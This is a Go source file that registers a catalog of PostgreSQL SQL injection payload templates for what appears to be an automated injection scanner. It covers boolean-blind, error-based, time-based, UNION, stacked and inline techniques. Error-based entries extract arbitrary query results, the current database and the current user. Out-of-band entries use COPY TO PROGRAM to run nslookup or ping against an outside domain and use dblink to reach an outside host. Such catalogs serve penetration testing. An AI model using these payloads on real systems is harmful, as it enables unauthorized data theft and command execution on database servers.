package payloads

// PostgreSQL payload catalog.

func pgRow(id, title, tech, clause, minv, maxv string, risk, level, conf int, pre, suf, tpl string) Payload {
	return Payload{
		ID: id, Title: title, DBMS: DBPostgres, Technique: Technique(tech),
		Clause: Clause(clause), MinVersion: minv, MaxVersion: maxv,
		Risk: risk, Level: level, Confidence: conf,
		PrefixMode: pre, SuffixMode: suf, Template: tpl,
	}
}

func init() {
	rows := []Payload{
		// ---- Boolean ----
		pgRow("pg-bool-and-num", "PostgreSQL AND boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 1, 90, "and", "none", "{orig} AND 1=1"),
		pgRow("pg-bool-and-string", "PostgreSQL AND boolean-based blind - WHERE clause (string)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig}' AND '1'='1"),
		pgRow("pg-bool-and-alpha", "PostgreSQL AND boolean-based blind - WHERE clause (alphabetic)", "boolean", "where", "", "", 1, 1, 88, "and", "comment", "{orig}' AND 'a'='a"),
		pgRow("pg-bool-or-num", "PostgreSQL OR boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 2, 88, "or", "none", "{orig} OR 1=1"),
		pgRow("pg-bool-and-paren", "PostgreSQL AND boolean-based blind - WHERE clause (paren)", "boolean", "where", "", "", 1, 2, 86, "and", "none", "{orig} AND (1=1)"),
		pgRow("pg-bool-and-sub", "PostgreSQL AND boolean-based blind - WHERE clause (subquery)", "boolean", "where", "", "", 1, 2, 88, "and", "none", "{orig} AND (SELECT 1)=1"),
		pgRow("pg-bool-cast", "PostgreSQL AND boolean-based blind - WHERE clause (CAST numeric)", "boolean", "where", "", "", 1, 2, 86, "and", "comment", "{orig}' AND CAST('1' AS INT)=1"),
		pgRow("pg-bool-true", "PostgreSQL AND boolean-based blind - WHERE clause (IS TRUE)", "boolean", "where", "", "", 1, 3, 82, "and", "comment", "{orig}' AND '1' IS TRUE"),
		pgRow("pg-bool-not", "PostgreSQL AND boolean-based blind - WHERE clause (NOT)", "boolean", "where", "", "", 1, 3, 82, "and", "comment", "{orig}' AND NOT('1'='2')"),
		pgRow("pg-bool-having", "PostgreSQL AND boolean-based blind - HAVING clause", "boolean", "having", "", "", 1, 3, 84, "and", "none", "{orig} HAVING 1=1"),
		pgRow("pg-bool-groupby", "PostgreSQL AND boolean-based blind - GROUP BY clause", "boolean", "groupby", "", "", 1, 3, 82, "and", "none", "{orig} GROUP BY 1 HAVING 1=1"),
		pgRow("pg-bool-orderby", "PostgreSQL AND boolean-based blind - ORDER BY clause", "boolean", "orderby", "", "", 1, 2, 84, "and", "none", "{orig} ORDER BY (SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END)"),

		// ---- Error-based ----
		pgRow("pg-err-cast-int", "PostgreSQL AND error-based - WHERE clause (CAST int)", "error", "where", "", "", 1, 1, 90, "and", "comment", "{orig}' AND CAST((SELECT ({query})) AS INT)=1"),
		pgRow("pg-err-cast-numeric", "PostgreSQL AND error-based - WHERE clause (CAST numeric)", "error", "where", "", "", 1, 2, 88, "and", "comment", "{orig}' AND 1=CAST((SELECT ({query})) AS NUMERIC)"),
		pgRow("pg-err-div-zero", "PostgreSQL AND error-based - WHERE clause (division by zero)", "error", "where", "", "", 1, 2, 86, "and", "comment", "{orig}' AND (SELECT 1/(0))"),
		pgRow("pg-err-case-div", "PostgreSQL AND error-based - WHERE clause (CASE + division by zero)", "error", "where", "", "", 1, 2, 88, "and", "comment", "{orig}' AND (SELECT CASE WHEN 1=1 THEN (SELECT 1/(0)) ELSE 1 END)"),
		pgRow("pg-err-current-db", "PostgreSQL AND error-based - WHERE clause (CAST current_database)", "error", "where", "", "", 1, 2, 90, "and", "comment", "{orig}' AND 1=CAST((SELECT current_database()) AS INT)"),
		pgRow("pg-err-current-user", "PostgreSQL AND error-based - WHERE clause (CAST current_user)", "error", "where", "", "", 1, 2, 90, "and", "comment", "{orig}' AND 1=CAST((SELECT current_user) AS INT)"),
		pgRow("pg-err-lower", "PostgreSQL AND error-based - WHERE clause (LOWER/CHR type mismatch)", "error", "where", "", "", 1, 3, 84, "and", "comment", "{orig}' AND LOWER(CHR(65)||CHR(66))=(SELECT 1)"),
		pgRow("pg-err-to-number", "PostgreSQL AND error-based - WHERE clause (TO_NUMBER)", "error", "where", "", "", 1, 3, 86, "and", "comment", "{orig}' AND TO_NUMBER((SELECT ({query})),'9')=1"),
		pgRow("pg-err-int-concat", "PostgreSQL AND error-based - WHERE clause (int + text concat)", "error", "where", "", "", 1, 3, 84, "and", "comment", "{orig}' AND 1=(SELECT 1||(SELECT ({query})))"),

		// ---- Time-based ----
		pgRow("pg-time-pgsleep", "PostgreSQL AND time-based blind - WHERE clause (pg_sleep)", "time", "where", "8.0", "", 1, 1, 90, "and", "none", "{orig} AND pg_sleep({seconds})"),
		pgRow("pg-time-pgsleep-str", "PostgreSQL AND time-based blind - WHERE clause (pg_sleep string)", "time", "where", "8.0", "", 1, 2, 90, "and", "comment", "{orig}' AND pg_sleep({seconds})"),
		pgRow("pg-time-pgsleep-or", "PostgreSQL OR time-based blind - WHERE clause (pg_sleep)", "time", "where", "8.0", "", 1, 3, 88, "or", "none", "{orig} OR pg_sleep({seconds})"),
		pgRow("pg-time-pgsleep-sub", "PostgreSQL AND time-based blind - WHERE clause (pg_sleep subquery)", "time", "where", "8.0", "", 1, 2, 90, "and", "none", "{orig} AND (SELECT pg_sleep({seconds}))"),
		pgRow("pg-time-case-pgsleep", "PostgreSQL AND time-based blind - WHERE clause (CASE + pg_sleep)", "time", "where", "8.0", "", 1, 2, 88, "and", "none", "{orig} AND (SELECT CASE WHEN 1=1 THEN pg_sleep({seconds}) ELSE pg_sleep(0) END)"),
		pgRow("pg-time-card", "PostgreSQL AND time-based blind - WHERE clause (SELECT 1)", "time", "where", "", "", 2, 3, 84, "and", "comment", "{orig} AND (SELECT 1 FROM pg_sleep({seconds})) IS NULL"),
		pgRow("pg-time-heaviness", "PostgreSQL AND time-based blind - WHERE clause (generate_series heavy)", "time", "where", "9.0", "", 3, 4, 84, "and", "comment", "{orig} AND (SELECT COUNT(*) FROM generate_series(1,{seconds}*1000000)) IS NULL"),
		pgRow("pg-time-join", "PostgreSQL AND time-based blind - WHERE clause (heavy cross join)", "time", "where", "", "", 2, 4, 84, "and", "comment", "{orig} AND (SELECT COUNT(*) FROM pg_class a, pg_class b, pg_class c)>=1"),

		// ---- UNION ----
		pgRow("pg-union-orderby", "PostgreSQL UNION query - ORDER BY column probe", "union", "where", "", "", 1, 1, 88, "replace", "comment", "{orig} ORDER BY {marker}"),
		pgRow("pg-union-select-null", "PostgreSQL UNION query - UNION SELECT NULL", "union", "where", "", "", 1, 1, 90, "replace", "none", "{orig} UNION SELECT {colcount}"),
		pgRow("pg-union-all-null", "PostgreSQL UNION query - UNION ALL SELECT NULL", "union", "where", "", "", 1, 1, 90, "replace", "none", "{orig} UNION ALL SELECT {colcount}"),
		pgRow("pg-union-select-marker", "PostgreSQL UNION query - UNION SELECT marker", "union", "where", "", "", 1, 2, 92, "replace", "comment", "{orig} UNION SELECT {marker},{colcount}"),

		// ---- Stacked ----
		pgRow("pg-stack-pgsleep", "PostgreSQL stacked queries - ;SELECT pg_sleep", "stacked", "generic", "8.0", "", 2, 3, 88, "term", "comment", "{orig};SELECT pg_sleep({seconds})"),
		pgRow("pg-stack-if-pgsleep", "PostgreSQL stacked queries - ;SELECT CASE pg_sleep", "stacked", "generic", "8.0", "", 2, 4, 86, "term", "comment", "{orig};SELECT CASE WHEN 1=1 THEN pg_sleep({seconds}) ELSE 0 END"),
		pgRow("pg-stack-copy", "PostgreSQL stacked queries - COPY TO PROGRAM (risk)", "stacked", "generic", "9.0", "", 3, 4, 84, "term", "comment", "{orig};COPY (SELECT 'vx') TO PROGRAM 'ping -c 1 {domain}'"),
		pgRow("pg-stack-select", "PostgreSQL stacked queries - ;SELECT 1", "stacked", "generic", "", "", 2, 4, 82, "term", "comment", "{orig};SELECT 1"),

		// ---- Inline ----
		pgRow("pg-inline-sub", "PostgreSQL inline query - subquery as value", "inline", "where", "", "", 1, 1, 86, "value", "none", "(SELECT 1)"),
		pgRow("pg-inline-nested", "PostgreSQL inline query - nested subquery comparison", "inline", "where", "", "", 1, 2, 84, "and", "none", "{orig} AND (SELECT 8634)=(SELECT 8634)"),
		pgRow("pg-inline-case", "PostgreSQL inline query - CASE subquery", "inline", "where", "", "", 1, 3, 84, "and", "none", "{orig} AND (SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END)=1"),
		pgRow("pg-inline-fn", "PostgreSQL inline query - function subquery comparison", "inline", "where", "", "", 1, 3, 84, "and", "none", "{orig} AND (SELECT version()) IS NOT NULL"),
		pgRow("pg-inline-chr", "PostgreSQL inline query - CHR concat helper", "inline", "where", "", "", 1, 3, 82, "and", "none", "{orig} AND (SELECT CHR(65)||CHR(66))='AB'"),

		// ---- OOB ----
		pgRow("pg-oob-copy-program", "PostgreSQL out-of-band - COPY TO PROGRAM DNS (risk)", "oob", "generic", "9.0", "", 3, 4, 80, "term", "comment", "{orig};COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'"),
		pgRow("pg-oob-dblink", "PostgreSQL out-of-band - dblink DNS (risk)", "oob", "generic", "9.0", "", 3, 5, 78, "term", "comment", "{orig};SELECT dblink('host={domain}')"),
	}
	for _, p := range rows {
		MustRegister(p)
	}
}
